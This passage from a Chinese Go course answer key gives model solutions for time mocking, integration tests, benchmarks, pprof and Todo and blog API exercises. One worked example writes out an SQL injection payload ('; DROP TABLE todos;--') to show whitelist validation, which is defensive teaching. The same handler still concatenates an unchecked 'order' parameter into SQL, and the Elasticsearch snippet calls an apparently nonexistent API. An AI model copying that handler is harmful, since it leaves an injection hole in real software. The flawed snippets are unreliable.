    // 注入固定时间：2026-07-01（活动期外）
    expiredClock := FixedClock{t: time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC)}
    svc2 := &UserService{repo: mockRepo, clock: expiredClock}

    in, err = svc2.IsInCampaign(context.Background(), 1)
    assert.NoError(t, err)
    assert.False(t, in)
}
```

**方案二：使用 `github.com/benbjohnson/clock` 库**

```go
import "github.com/benbjohnson/clock"

func TestIsInCampaign_WithClockLib(t *testing.T) {
    mockRepo := new(MockUserRepository)
    mockRepo.On("GetByID", mock.Anything, int64(1)).Return(&User{ID: 1, Name: "test"}, nil)

    mockClock := clock.NewMock()
    mockClock.Set(time.Date(2026, 6, 15, 12, 0, 0, 0, time.UTC))

    svc := &UserService{repo: mockRepo, clock: mockClock}
    in, _ := svc.IsInCampaign(context.Background(), 1)
    assert.True(t, in)

    // MockClock 还支持 Add，可推进时间
    mockClock.Add(20 * 24 * time.Hour) // 跳到 7 月 5 日
    in, _ = svc.IsInCampaign(context.Background(), 1)
    assert.False(t, in)
}
```

**方案三：函数变量替换（不推荐，侵入性强）**

```go
var nowFunc = time.Now
// 测试中：nowFunc = func() time.Time { return fixedTime }
```

**解析**：
- **方案一（依赖注入）**最推荐：通过 Clock 接口注入，生产代码用 RealClock，测试用 FixedClock。符合依赖倒置原则，零侵入。
- **方案二（clock 库）**功能更强：MockClock 支持 `Set`、`Add`（推进时间）、`After` 接收 channel 通知，适合测试定时器、超时等复杂场景。
- **方案三（函数变量替换）**最简单但不安全：全局变量在高并发测试中可能竞态，且需要 `t.Cleanup` 恢复原值。

**改值实验**：
- **将 FixedClock 时间设为边界值 `2026-06-01 00:00:00`**：此时 `now.After(campaignStart)` 为 false（相等不算 After），结果为 `false`。如果想包含边界，应使用 `!now.Before(campaignStart) && now.Before(campaignEnd)`。
- **将 FixedClock 时间设为 `2026-06-30 23:59:59`**：`now.Before(campaignEnd)` 为 false（相等不算 Before），结果为 `false`。边界值测试最容易暴露 `>` vs `>=` 的 off-by-one 错误。

---

## 第108章 · 集成测试

### K-108-1 HTTP 接口集成测试

**标准答案**：

```go
package main

import (
    "bytes"
    "encoding/json"
    "net/http"
    "net/http/httptest"
    "strconv"
    "testing"

    "github.com/gin-gonic/gin"
    "github.com/stretchr/testify/assert"
)

func setupTestRouter() *gin.Engine {
    gin.SetMode(gin.TestMode)
    r := gin.Default()
    r.POST("/api/v1/users", CreateUser)
    r.GET("/api/v1/users/:id", GetUser)
    r.PUT("/api/v1/users/:id", UpdateUser)
    r.DELETE("/api/v1/users/:id", DeleteUser)
    return r
}

func TestUserCRUDIntegration(t *testing.T) {
    router := setupTestRouter()
    ts := httptest.NewServer(router)
    defer ts.Close()

    // 1. POST — 创建用户
    t.Run("POST /api/v1/users", func(t *testing.T) {
        body := map[string]interface{}{
            "name":  "测试用户",
            "email": "test@example.com",
            "age":   25,
        }
        jsonBody, _ := json.Marshal(body)
        resp, err := http.Post(ts.URL+"/api/v1/users", "application/json", bytes.NewBuffer(jsonBody))
        assert.NoError(t, err)
        assert.Equal(t, 201, resp.StatusCode)

        var result map[string]interface{}
        json.NewDecoder(resp.Body).Decode(&result)
        resp.Body.Close()
        assert.NotZero(t, result["id"])
        assert.Equal(t, "测试用户", result["name"])
    })

    // 2. GET — 查询刚创建的用户
    var createdID int64
    t.Run("POST 创建用于后续测试的用户", func(t *testing.T) {
        body := map[string]interface{}{
            "name":  "集成测试专用用户",
            "email": "integration@example.com",
            "age":   30,
        }
        jsonBody, _ := json.Marshal(body)
        resp, _ := http.Post(ts.URL+"/api/v1/users", "application/json", bytes.NewBuffer(jsonBody))
        var result map[string]interface{}
        json.NewDecoder(resp.Body).Decode(&result)
        resp.Body.Close()
        createdID = int64(result["id"].(float64))
        assert.NotZero(t, createdID)
    })

    t.Run("GET /api/v1/users/:id — 查询存在用户", func(t *testing.T) {
        resp, err := http.Get(ts.URL + "/api/v1/users/" + strconv.FormatInt(createdID, 10))
        assert.NoError(t, err)
        assert.Equal(t, 200, resp.StatusCode)

        var result map[string]interface{}
        json.NewDecoder(resp.Body).Decode(&result)
        resp.Body.Close()
        assert.Equal(t, "集成测试专用用户", result["name"])
    })

    // 3. PUT — 更新用户名
    t.Run("PUT /api/v1/users/:id — 更新用户名", func(t *testing.T) {
        body := map[string]interface{}{"name": "更新后的用户名"}
        jsonBody, _ := json.Marshal(body)
        req, _ := http.NewRequest("PUT", ts.URL+"/api/v1/users/"+strconv.FormatInt(createdID, 10), bytes.NewBuffer(jsonBody))
        req.Header.Set("Content-Type", "application/json")
        resp, err := http.DefaultClient.Do(req)
        assert.NoError(t, err)
        assert.Equal(t, 200, resp.StatusCode)
        resp.Body.Close()
    })

    // 4. DELETE — 删除用户
    t.Run("DELETE /api/v1/users/:id — 删除用户", func(t *testing.T) {
        req, _ := http.NewRequest("DELETE", ts.URL+"/api/v1/users/"+strconv.FormatInt(createdID, 10), nil)
        resp, err := http.DefaultClient.Do(req)
        assert.NoError(t, err)
        assert.Equal(t, 204, resp.StatusCode)
        resp.Body.Close()
    })

    // 5. GET — 再次查询已删除用户，应返回 404
    t.Run("GET /api/v1/users/:id — 查询已删除用户应 404", func(t *testing.T) {
        resp, err := http.Get(ts.URL + "/api/v1/users/" + strconv.FormatInt(createdID, 10))
        assert.NoError(t, err)
        assert.Equal(t, 404, resp.StatusCode)
        resp.Body.Close()
    })
}
```

**解析**：
- `httptest.NewServer(router)`：创建一个真实的 HTTP 服务器（绑定随机端口），测试用真实的 HTTP 请求发送数据。
- 每个子测试独立创建用户，避免测试间依赖。`t.Run` 保证子测试顺序执行（非并行模式默认串行）。
- 集成测试验证了完整的 HTTP 请求-响应链路，包括路由匹配、JSON 序列化/反序列化、状态码。相比纯单元测试，能更真实地模拟客户端行为。

**改值实验**：
- **把 POST body 中 `"email"` 字段去掉**：如果 handler 中用了 `c.ShouldBindJSON(&req)` 且 Email 是 required，会返回 400 + 校验错误信息。这说明集成测试能覆盖参数校验逻辑。
- **把 DELETE 的 ID 改成不存在的值（如 -1）**：如果 handler 没有做"记录不存在"的判断而直接硬删，可能返回 204（假删除成功）。正确的实现应该区分"删除不存在记录"（404）和"删除成功"（204）。

---

### K-108-2 数据库集成测试 ⭐

**标准答案**：

```go
package repository

import (
    "context"
    "database/sql"
    "fmt"
    "testing"
    "time"

    "github.com/stretchr/testify/assert"
    "github.com/testcontainers/testcontainers-go"
    "github.com/testcontainers/testcontainers-go/wait"
    _ "github.com/go-sql-driver/mysql"

    "gorm.io/driver/mysql"
    "gorm.io/gorm"
)

func setupMySQLContainer(ctx context.Context) (testcontainers.Container, string, error) {
    req := testcontainers.ContainerRequest{
        Image:        "mysql:8.0",
        ExposedPorts: []string{"3306/tcp"},
        Env: map[string]string{
            "MYSQL_ROOT_PASSWORD": "testpass",
            "MYSQL_DATABASE":      "testdb",
        },
        WaitingFor: wait.ForLog("ready for connections").WithStartupTimeout(60 * time.Second),
    }
    container, err := testcontainers.GenericContainer(ctx, testcontainers.GenericContainerRequest{
        ContainerRequest: req,
        Started:          true,
    })
    if err != nil {
        return nil, "", err
    }

    host, _ := container.Host(ctx)
    port, _ := container.MappedPort(ctx, "3306")
    dsn := fmt.Sprintf("root:testpass@tcp(%s:%d)/testdb?charset=utf8mb4&parseTime=True", host, port.Int())
    return container, dsn, nil
}

func TestUserRepository_CRUD_WithRealMySQL(t *testing.T) {
    if testing.Short() {
        t.Skip("跳过集成测试（需 Docker）")
    }

    ctx := context.Background()
    container, dsn, err := setupMySQLContainer(ctx)
    assert.NoError(t, err)
    defer container.Terminate(ctx)

    db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
    assert.NoError(t, err)

    rawDB, _ := db.DB()
    defer rawDB.Close()

    // 自动迁移
    db.AutoMigrate(&User{})

    repo := NewUserRepository(db)

    // CREATE
    t.Run("Create", func(t *testing.T) {
        user := &User{Name: "张三", Email: "zhangsan@example.com", Age: 28}
        err := repo.Create(ctx, user)
        assert.NoError(t, err)
        assert.NotZero(t, user.ID)
    })

    // READ
    t.Run("GetByID", func(t *testing.T) {
        user, err := repo.GetByID(ctx, 1)
        assert.NoError(t, err)
        assert.Equal(t, "张三", user.Name)
    })

    // UPDATE
    t.Run("Update", func(t *testing.T) {
        err := repo.Update(ctx, &User{ID: 1, Name: "张三改"})
        assert.NoError(t, err)
        user, _ := repo.GetByID(ctx, 1)
        assert.Equal(t, "张三改", user.Name)
    })

    // DELETE
    t.Run("Delete", func(t *testing.T) {
        err := repo.Delete(ctx, 1)
        assert.NoError(t, err)
        _, err = repo.GetByID(ctx, 1)
        assert.Error(t, err)
    })
}
```

运行命令：
```bash
go test -v -run TestUserRepository_CRUD ./repository/
# 若 Docker 不可用，跳过集成测试：
go test -v -short ./...
```

**解析**：
- `testcontainers-go` 通过 Docker API 启动临时 MySQL 容器，测试结束后 `Terminate` 自动销毁，零残留。
- `wait.ForLog("ready for connections")`：等待 MySQL 真正可用（而不是容器启动后立即连接，此时 MySQL 可能尚未完成初始化）。
- `testing.Short()` 守卫：CI 环境若未安装 Docker，`go test -short` 会跳过此测试，避免构建失败。

**改值实验**：
- **将 MySQL 镜像版本从 `8.0` 改成 `5.7`**：字符集默认值不同（MySQL 5.7 默认 `latin1`），可能导致中文插入乱码。解决方案：DSN 中显式指定 `charset=utf8mb4`。
- **去掉 `WaitingFor` 等待条件**：直接连接 MySQL 大概率报 `dial tcp: connection refused`，因为容器虽然启动了但 MySQL 服务尚未就绪。这正是 WaitStrategy 存在的意义。

---

## 第109章 · 性能测试

### K-109-1 Benchmark + pprof 分析

**标准答案**：

```go
package benchmark

import (
    "encoding/json"
    "fmt"
    "strings"
    "testing"

    jsoniter "github.com/json-iterator/go"
)

type Person struct {
    Name    string   `json:"name"`
    Age     int      `json:"age"`
    Email   string   `json:"email"`
    Tags    []string `json:"tags"`
    Address string   `json:"address"`
}

var testPerson = Person{
    Name: "张三张三张三", Age: 28, Email: "zhangsan@example.com",
    Tags: []string{"go", "backend", "gin", "gorm"}, Address: "北京市朝阳区xxx路xxx号",
}

// ===== 场景 A：字符串拼接 =====

func BenchmarkStringConcat_Plus(b *testing.B) {
    parts := []string{"Hello", " ", "World", " ", "2026"}
    for i := 0; i < b.N; i++ {
        var s string
        for _, p := range parts {
            s += p
        }
        _ = s
    }
}

func BenchmarkStringConcat_Builder(b *testing.B) {
    parts := []string{"Hello", " ", "World", " ", "2026"}
    for i := 0; i < b.N; i++ {
        var sb strings.Builder
        for _, p := range parts {
            sb.WriteString(p)
        }
        _ = sb.String()
    }
}

func BenchmarkStringConcat_Sprintf(b *testing.B) {
    for i := 0; i < b.N; i++ {
        _ = fmt.Sprintf("%s %s %d", "Hello", "World", 2026)
    }
}

// ===== 场景 B：JSON 序列化 =====

var jsoniterAPI = jsoniter.ConfigCompatibleWithStandardLibrary

func BenchmarkJSON_StdLib(b *testing.B) {
    for i := 0; i < b.N; i++ {
        data, _ := json.Marshal(testPerson)
        _ = data
    }
}

func BenchmarkJSON_Jsoniter(b *testing.B) {
    for i := 0; i < b.N; i++ {
        data, _ := jsoniterAPI.Marshal(testPerson)
        _ = data
    }
}

// ===== 场景 C：切片预分配 vs 动态扩容 =====

func BenchmarkSlice_NoPrealloc(b *testing.B) {
    for i := 0; i < b.N; i++ {
        var s []int
        for j := 0; j < 10000; j++ {
            s = append(s, j)
        }
        _ = s
    }
}

func BenchmarkSlice_Prealloc(b *testing.B) {
    for i := 0; i < b.N; i++ {
        s := make([]int, 0, 10000)
        for j := 0; j < 10000; j++ {
            s = append(s, j)
        }
        _ = s
    }
}
```

运行命令与输出分析：
```bash
go test -bench=. -benchmem -benchtime=3s ./benchmark/
```

典型结果分析：
| 场景 | 实现 | ns/op | B/op | allocs/op | 结论 |
|------|------|-------|------|-----------|------|
| 字符串拼接 | `+`   | ~300  | ~480 | ~5        | 每次拼接都分配新内存，最慢 |
| 字符串拼接 | `Builder` | ~60 | ~48 | ~1 | 内部维护 byte 切片，预分配后零额外分配，最优 |
| 字符串拼接 | `Sprintf` | ~200 | ~56 | ~2 | 有反射开销，比 Builder 慢但比 + 快 |
| JSON 序列化 | `encoding/json` | ~2400 | ~400 | ~8 | 反射开销大 |
| JSON 序列化 | `jsoniter` | ~700 | ~300 | ~5 | 不依赖反射，约 3~4 倍提升 |
| 切片扩容 | 无预分配 | ~1800 | ~326k | ~28 | 多次触发 growslice 和 memmove |
| 切片扩容 | 预分配 | ~200 | ~80k | ~1 | 一次分配到位，约 9 倍提升 |

**解析**：
- `-benchmem`：显示每次操作的内存分配量（B/op）和分配次数（allocs/op），这是性能分析的核心指标。
- `strings.Builder` 内部维护 `[]byte`，`Grow` 预分配后 `WriteString` 零分配。而 `+` 拼接每次循环都新建字符串并拷贝，复杂度 O(n²)。
- `jsoniter` 通过代码生成避免反射，在高频序列化场景下效果明显。但需注意其兼容性不如标准库。
- 切片预分配是最简单的性能优化，效果也最显著——避免多次 growslice（扩容时旧数组拷贝到新数组）。

**改值实验**：
- **把 parts 数量从 5 个增加到 100 个**：`+` 的 ns/op 会从 ~300 飙升至 ~5000（O(n²)），而 `Builder` 基本线性增长（~600）。差距从 5 倍扩大到 8 倍以上，说明大字符串拼接必须用 Builder。
- **把 JSON 对象中的 `Tags` 从 4 个增加到 100 个**：`encoding/json` 的分配次数随字段数量线性增长，而 `jsoniter` 的分配次数增长更慢。序列化复杂嵌套结构时 jsoniter 优势更明显。

---

### K-109-2 pprof 性能排查 ⭐

**标准答案**：

**构造有性能问题的程序**：

```go
package main

import (
    "fmt"
    "net/http"
    _ "net/http/pprof"
    "os"
    "runtime"
    "time"
)

var leakSink []string

func memoryLeakWorker() {
    for {
        data := make([]byte, 1024*1024) // 1MB
        leakSink = append(leakSink, string(data))
        time.Sleep(10 * time.Millisecond)
    }
}

func cpuHotspotWorker() {
    for {
        result := 0
        for i := 0; i < 100_000_000; i++ {
            result += i * i
        }
        fmt.Fprintln(os.DevNull, result)
    }
}

func main() {
    go func() {
        fmt.Println("pprof 监听 :6060")
        http.ListenAndServe(":6060", nil)
    }()

    go memoryLeakWorker()  // 内存泄漏协程
    go cpuHotspotWorker()   // CPU 热点协程

    select {}
}
```

**分析步骤**：

```bash
# 1. 启动程序
go run main.go

# 2. 采集 CPU profile（30 秒采样）
go tool pprof http://localhost:6060/debug/pprof/profile?seconds=30

# 3. 在 pprof 交互界面中
(pprof) top 10          # 查看 CPU 占用前 10 的函数
(pprof) list cpuHotspot # 查看具体函数的逐行耗时
(pprof) web             # 生成调用图（需 graphviz）

# 4. 采集 heap profile
go tool pprof http://localhost:6060/debug/pprof/heap

# 5. 在 pprof 交互界面中
(pprof) top 10          # 查看内存分配前 10
(pprof) list memoryLeak # 确认泄漏点
(pprof) web

# 6. 生成火焰图
go tool pprof -http=:8080 http://localhost:6060/debug/pprof/profile?seconds=30
# 浏览器打开 http://localhost:8080，选择 Flame Graph 视图
```

pprof `top 10` 典型输出：
```
(pprof) top 10
Showing nodes accounting for 28.50s, 95.32% of 29.90s total
      flat  flat%   sum%        cum   cum%
    15.20s 50.84% 50.84%     15.20s 50.84%  main.cpuHotspotWorker  ← CPU 热点
     5.10s 17.06% 67.89%      5.10s 17.06%  runtime.mallocgc      ← 内存分配
     3.80s 12.71% 80.60%      3.80s 12.71%  runtime.memclrNoHeap
     ...
```

**定位与修复**：
- **CPU 热点**：`cpuHotspotWorker` 占 50.84%，原因是无意义的密集循环计算。修复：移除无用计算，或用 `sync.WaitGroup` 控制协程生命周期。
- **内存泄漏**：`leakSink` 全局切片持续 append，GC 无法回收。修复：使用 ring buffer 限制容量，或定期清理过期数据。

```go
// 修复后的内存泄漏协程
func memoryLeakFixed() {
    const maxSize = 100
    buffer := make([]string, 0, maxSize)
    for {
        data := make([]byte, 1024*1024)
        if len(buffer) >= maxSize {
            buffer = buffer[1:] // 丢弃旧数据，限制上限
        }
        buffer = append(buffer, string(data))
        time.Sleep(10 * time.Millisecond)
    }
}
```

验证修复效果：
```bash
go run main_fixed.go &
# 再次采集 profile，对比 heap 增长曲线
go tool pprof -http=:8080 http://localhost:6060/debug/pprof/heap
# 连续采样两次，对比 inuse_space 是否持续增长
```

**解析**：
- `flat` 表示函数自身耗时（不含调用的子函数），`cum`（cumulative）包含子函数。
- 火焰图中宽度 = CPU 时间占比，从下到上是调用栈，最宽的函数即瓶颈。
- heap profile 看 `inuse_space`（当前使用量）而非 `alloc_space`（累计分配量），泄漏体现在 `inuse_space` 单调增长。
- `pprof` 采样基于 SIGPROF 信号（每 10ms 一次），采样时间越长越准确，但会引入微小的观测者效应。

**改值实验**：
- **将 CPU 热点循环次数从 `100_000_000` 降到 `1_000_000`**：`cpuHotspotWorker` 的 `flat%` 会从 ~50% 降到 ~5%。这说明 pprof 能准确反映代码修改后的性能差异，是迭代优化的核心工具。
- **注释掉 `leakSink = append(...)`** 但保留 `data` 分配：heap profile 中 `inuse_space` 不再增长（局部变量分配后 GC 回收）。说明泄漏的根因不是"分配了大量内存"，而是"这些内存被全局变量持有导致无法回收"。

---

## 第110章 · 项目 Todo API

### K-110-P1 为 Todo API 增加优先级字段

**标准答案**：

**1. Migration SQL**：

```sql
ALTER TABLE todos ADD COLUMN priority TINYINT NOT NULL DEFAULT 2 
    COMMENT '1=低, 2=中, 3=高' 
    AFTER description;

CREATE INDEX idx_todos_priority ON todos(priority);
```

**2. 模型修改**：

```go
type Todo struct {
    ID          int64     `json:"id" gorm:"primaryKey;autoIncrement"`
    Title       string    `json:"title" gorm:"not null;size:200"`
    Description string    `json:"description" gorm:"size:1000"`
    Priority    int8      `json:"priority" gorm:"not null;default:2;index"`
    Completed   bool      `json:"completed" gorm:"default:false"`
    CreatedAt   time.Time `json:"created_at"`
    UpdatedAt   time.Time `json:"updated_at"`
}
```

**3. 请求 DTO**：

```go
type CreateTodoRequest struct {
    Title       string `json:"title" binding:"required,min=1,max=200"`
    Description string `json:"description" binding:"max=1000"`
    Priority    *int8  `json:"priority"` // 指针类型，区分"未传"和"传0"
}
```

**4. Handler 修改**：

```go
func CreateTodo(c *gin.Context) {
    var req CreateTodoRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }

    priority := int8(2) // 默认中等
    if req.Priority != nil {
        if *req.Priority < 1 || *req.Priority > 3 {
            c.JSON(400, gin.H{"error": "priority must be 1, 2, or 3"})
            return
        }
        priority = *req.Priority
    }

    todo := Todo{
        Title:       req.Title,
        Description: req.Description,
        Priority:    priority,
    }

    if err := db.Create(&todo).Error; err != nil {
        c.JSON(500, gin.H{"error": "创建失败"})
        return
    }
    c.JSON(201, todo)
}

func ListTodos(c *gin.Context) {
    var todos []Todo
    query := db.Model(&Todo{})

    // 按优先级筛选
    if priorityStr := c.Query("priority"); priorityStr != "" {
        p, err := strconv.Atoi(priorityStr)
        if err != nil || p < 1 || p > 3 {
            c.JSON(400, gin.H{"error": "priority 需为 1~3"})
            return
        }
        query = query.Where("priority = ?", p)
    }

    // 排序
    sortBy := c.DefaultQuery("sort_by", "created_at")
    order := c.DefaultQuery("order", "desc")
    allowedSorts := map[string]bool{"created_at": true, "priority": true, "title": true}
    if !allowedSorts[sortBy] {
        c.JSON(400, gin.H{"error": "sort_by 仅支持 created_at/priority/title"})
        return
    }
    query = query.Order(sortBy + " " + order)

    query.Find(&todos)
    c.JSON(200, todos)
}
```

**解析**：
- `*int8` 指针类型区分"未传"（nil）和"显式传 0"。若直接用 `int8`，JSON 中不传时默认值为 0（无效值），无法判断用户意图。
- 白名单校验排序字段：防止 SQL 注入（虽然 GORM 已参数化，但仍需防止无效 ORDER BY）。
- `default:2` 同时在数据库层和 Go 代码层设置默认值，双重保障。

**改值实验**：
- **创建时传 `"priority": 5`**：handler 返回 `400 {"error":"priority must be 1, 2, or 3"}`。说明参数校验比数据库约束更快、更友好——数据库 `CHECK` 约束报错信息不直观。
- **查询 `?sort_by=id&order=asc; DROP TABLE todos;--`**：白名单拦截 `sort_by=id`（不在允许列表中），返回 400。若未做白名单校验直接拼接 SQL，极端情况下可能导致 SQL 注入。

---

### K-110-P2 批量操作扩展 ⭐

**标准答案**：

```go
type BatchUpdateRequest struct {
    IDs     []int64 `json:"ids" binding:"required,min=1,max=100"`
    Status  string  `json:"status" binding:"required,oneof=todo doing done"`
}

type BatchResultItem struct {
    ID     int64  `json:"id"`
    Result string `json:"result"` // "ok" or "failed: reason"
}

type BatchResult struct {
    SuccessCount int               `json:"success_count"`
    FailCount    int               `json:"fail_count"`
    Items        []BatchResultItem `json:"items"`
}

// PATCH /api/v1/todos/batch
func BatchUpdateStatus(c *gin.Context) {
    var req BatchUpdateRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }

    result := BatchResult{Items: make([]BatchResultItem, 0, len(req.IDs))}

    err := db.Transaction(func(tx *gorm.DB) error {
        for _, id := range req.IDs {
            res := tx.Model(&Todo{}).Where("id = ?", id).Update("status", req.Status)
            if res.Error != nil {
                result.Items = append(result.Items, BatchResultItem{
                    ID: id, Result: fmt.Sprintf("failed: %v", res.Error),
                })
                result.FailCount++
            } else if res.RowsAffected == 0 {
                result.Items = append(result.Items, BatchResultItem{
                    ID: id, Result: "failed: not found",
                })
                result.FailCount++
            } else {
                result.Items = append(result.Items, BatchResultItem{
                    ID: id, Result: "ok",
                })
                result.SuccessCount++
            }
        }
        return nil // 不因部分失败而回滚
    })

    if err != nil {
        c.JSON(500, gin.H{"error": "事务执行失败"})
        return
    }
    c.JSON(200, result)
}

// DELETE /api/v1/todos/batch
func BatchDelete(c *gin.Context) {
    var req struct {
        IDs []int64 `json:"ids" binding:"required,min=1,max=100"`
    }
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }

    result := BatchResult{Items: make([]BatchResultItem, 0, len(req.IDs))}

    err := db.Transaction(func(tx *gorm.DB) error {
        for _, id := range req.IDs {
            res := tx.Where("id = ?", id).Delete(&Todo{})
            if res.RowsAffected > 0 {
                result.Items = append(result.Items, BatchResultItem{ID: id, Result: "ok"})
                result.SuccessCount++
            } else {
                result.Items = append(result.Items, BatchResultItem{ID: id, Result: "failed: not found"})
                result.FailCount++
            }
        }
        return nil
    })

    if err != nil {
        c.JSON(500, gin.H{"error": "事务执行失败"})
        return
    }
    c.JSON(200, result)
}
```

**解析**：
- 事务中逐条处理但**不因部分失败回滚**：这是设计选择——批量操作中应该允许"部分成功"。若要求严格原子性（全成功或全回滚），则用 `return fmt.Errorf(...)` 在第一条失败时中止。
- `RowsAffected == 0`：区分"更新成功但无匹配行"和"数据库错误"。GORM 的 `Update` 在找不到记录时不会报错，仅 `RowsAffected=0`。
- `max=100` 绑定限制：防止一次批量操作过多导致长事务锁表。

**改值实验**：
- **传空的 ids 列表 `[]`**：`binding:"required,min=1"` 拦截，返回 400。`min=1` 是数组长度校验，不是元素值校验。
- **ids 中包含重复 id（如 [1, 1]）**：第一条返回 `"ok"`，第二条因为 status 已经是目标状态，`res.RowsAffected` 可能 = 1（如果不同值）或 = 0（如果相同值）。实际取决于 GORM 的 Update 是否有"忽略无变化行"的优化。建议业务层先去重。

---

## 第111章 · 项目博客系统

### K-111-P1 为博客系统增加标签功能

**标准答案**：

**1. DDL**：

```sql
CREATE TABLE tags (
    id   BIGINT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(50) NOT NULL UNIQUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE article_tags (
    article_id BIGINT NOT NULL,
    tag_id     BIGINT NOT NULL,
    PRIMARY KEY (article_id, tag_id),
    INDEX idx_tag_id (tag_id),
    FOREIGN KEY (article_id) REFERENCES articles(id) ON DELETE CASCADE,
    FOREIGN KEY (tag_id) REFERENCES tags(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

**2. 模型**：

```go
type Tag struct {
    ID        int64     `json:"id" gorm:"primaryKey"`
    Name      string    `json:"name" gorm:"unique;size:50"`
    CreatedAt time.Time `json:"created_at"`
}

type Article struct {
    ID        int64     `json:"id" gorm:"primaryKey"`
    Title     string    `json:"title"`
    Content   string    `json:"content"`
    Tags      []Tag     `json:"tags" gorm:"many2many:article_tags;"`
    // ...
}
```

**3. 创建文章同时设置标签**：

```go
type CreateArticleRequest struct {
    Title   string   `json:"title" binding:"required"`
    Content string   `json:"content" binding:"required"`
    Tags    []string `json:"tags"` // 标签名列表
}

func CreateArticle(c *gin.Context) {
    var req CreateArticleRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }

    article := Article{Title: req.Title, Content: req.Content}

    err := db.Transaction(func(tx *gorm.DB) error {
        if err := tx.Create(&article).Error; err != nil {
            return err
        }

        for _, tagName := range req.Tags {
            var tag Tag
            // 查找或创建标签（原子性处理重名）
            tx.Where("name = ?", tagName).FirstOrCreate(&tag, Tag{Name: tagName})
            // 建立关联
            tx.Create(&ArticleTag{ArticleID: article.ID, TagID: tag.ID})
        }
        return nil
    })

    if err != nil {
        c.JSON(500, gin.H{"error": "创建失败"})
        return
    }

    db.Preload("Tags").First(&article, article.ID)
    c.JSON(201, article)
}
```

**4. 按标签筛选文章**：

```go
// GET /api/v1/articles?tag=golang
func ListArticles(c *gin.Context) {
    var articles []Article
    query := db.Model(&Article{}).Preload("Tags")

    if tag := c.Query("tag"); tag != "" {
        query = query.Joins("JOIN article_tags ON article_tags.article_id = articles.id").
            Joins("JOIN tags ON tags.id = article_tags.tag_id").
            Where("tags.name = ?", tag)
    }

    query.Order("created_at DESC").Find(&articles)
    c.JSON(200, articles)
}
```

**5. 热门标签接口**：

```go
type HotTag struct {
    Name        string `json:"name"`
    ArticleCount int64 `json:"article_count"`
}

// GET /api/v1/tags/hot
func HotTags(c *gin.Context) {
    var results []HotTag
    db.Raw(`
        SELECT t.name, COUNT(at.article_id) AS article_count
        FROM tags t
        JOIN article_tags at ON at.tag_id = t.id
        GROUP BY t.id, t.name
        ORDER BY article_count DESC
        LIMIT 10
    `).Scan(&results)
    c.JSON(200, results)
}
```

**解析**：
- `FirstOrCreate`：查找已有标签或创建新标签，防止重复标签。在事务中执行保证并发安全（唯一索引兜底）。
- 多对多关联用 `gorm:"many2many:article_tags;"` 标签让 GORM 自动处理 `Preload` 和关联查询。
- 热门标签用原生 SQL（`Raw`）：GROUP BY + COUNT 聚合是 GORM 链式 API 的弱项，原生 SQL 更清晰。

**改值实验**：
- **创建文章时传重复标签 `["golang", "golang"]`**：第二次 `FirstOrCreate` 找到已有标签，不会创建重复记录。但 `Create(&ArticleTag{...})` 会尝试插入重复的 `(article_id, tag_id)` 组合，PRIMARY KEY 冲突导致事务失败。应先去重或用 `FirstOrCreate` 替代 `Create`。
- **查询 `?tag=不存在的标签`**：JOIN 查不到匹配行，返回空列表（不是 404）。这是合理的：按不存在的标签筛选 → 零结果。前端应提示"未找到相关文章"而非报错。

---

### K-111-P2 文章全文搜索 ⭐

**标准答案**：

**方案一：MySQL FULLTEXT 索引**：

```sql
ALTER TABLE articles ADD FULLTEXT INDEX ft_articles (title, content);
```

```go
// GET /api/v1/articles/search?q=关键词&page=1&size=10
func SearchArticles(c *gin.Context) {
    q := c.Query("q")
    if q == "" {
        c.JSON(400, gin.H{"error": "q 参数必填"})
        return
    }

    page, _ := strconv.Atoi(c.DefaultQuery("page", "1"))
    size, _ := strconv.Atoi(c.DefaultQuery("size", "10"))

    var articles []Article
    var total int64

    // 布尔模式：支持 +必须包含 -排除 *前缀匹配
    query := db.Model(&Article{}).Preload("Tags").
        Where("MATCH(title, content) AGAINST(? IN BOOLEAN MODE)", q)

    query.Count(&total)
    query.Offset((page - 1) * size).Limit(size).Find(&articles)

    // 高亮关键词
    for i := range articles {
        articles[i].Title = highlight(articles[i].Title, q)
        articles[i].Content = highlightSnippet(articles[i].Content, q)
    }

    c.JSON(200, gin.H{
        "total": total,
        "page":  page,
        "size":  size,
        "data":  articles,
    })
}

func highlight(text, keyword string) string {
    return strings.ReplaceAll(text, keyword, "<mark>"+keyword+"</mark>")
}

func highlightSnippet(content, keyword string) string {
    idx := strings.Index(content, keyword)
    if idx < 0 {
        if len(content) > 200 {
            return content[:200] + "..."
        }
        return content
    }
    start := idx - 50
    if start < 0 {
        start = 0
    }
    end := idx + len(keyword) + 150
    if end > len(content) {
        end = len(content)
    }
    snippet := content[start:end]
    if start > 0 {
        snippet = "..." + snippet
    }
    if end < len(content) {
        snippet = snippet + "..."
    }
    return highlight(snippet, keyword)
}
```

**方案二：Elasticsearch 集成**（核心思路）：

```go
type ArticleDocument struct {
    ID      int64    `json:"id"`
    Title   string   `json:"title"`
    Content string   `json:"content"`
    Tags    []string `json:"tags"`
}

func SearchWithES(c *gin.Context) {
    q := c.Query("q")
    searchResult, err := esClient.Search(
        esClient.Search.WithIndex("articles"),
        esClient.Search.WithQuery(
            esapi.MultiMatchQuery(q, "title^3", "content", "tags"),
        ),
    )
    // ... 解析 ES 响应并返回
}
```

**性能优化策略**：
1. **IN BOOLEAN MODE**：支持运算符，比 NATURAL LANGUAGE MODE 更可控。
2. **分词**：中文需配置 ngram parser 或引入 `elasticsearch-analysis-ik` 分词器。
3. **缓存热门搜索**：Redis 缓存 top 100 搜索结果，TTL 5 分钟。
4. **异步索引**：文章更新后通过消息队列异步刷新 ES 索引。

**解析**：
- MySQL FULLTEXT 适合中小规模（百万级以下），零运维成本；Elasticsearch 适合大规模、复杂搜索（拼音、模糊、权重）。
- `title^3`：标题匹配权重是内容的 3 倍。
